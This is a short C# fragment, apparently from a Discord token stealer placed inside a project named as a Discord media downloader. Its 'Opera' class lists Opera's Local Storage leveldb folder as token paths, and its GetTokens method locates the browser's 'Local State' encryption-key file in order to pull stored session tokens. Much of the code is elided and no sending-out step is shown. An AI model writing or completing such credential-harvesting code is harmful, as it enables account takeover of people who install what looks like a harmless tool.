...
namespace Discord_Media_DL.Token.Apps
{
    class Opera : IApp
    {
        public string Name => "Opera";

        public string[] TokenPaths => new string[]
        {
             Help.Paths.Roaming + @"\Opera Software\Opera Stable\Local Storage\leveldb\"
        };
        ...
        public async Task<string[]> GetTokens()
        {
            ...
            var LocalStatePath = Path.Combine(Help.Paths.Roaming, @"Opera Software\Opera Stable\", "Local State");
